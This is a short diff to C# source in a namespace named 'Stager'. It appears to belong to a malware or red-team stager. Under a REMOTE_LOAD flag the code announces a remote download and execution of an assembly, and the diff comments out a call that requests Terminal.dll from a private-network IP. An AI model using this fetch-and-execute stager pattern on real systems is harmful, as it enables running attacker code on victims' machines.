@@ -47,7 +47,7 @@ namespace Stager
 #if REMOTE_LOAD
             Console.WriteLine("\n[*] Starting remote download then execution of assembly");
             StageZero stage = new StageZero(info, 5, 5);
-            stage.RequestStage(new Uri("https://192.168.1.194/Terminal.dll"));
+            //stage.RequestStage(new Uri("https://192.168.1.194/Terminal.dll"));
             
 #endif
             //Console.Read(); // Pause output
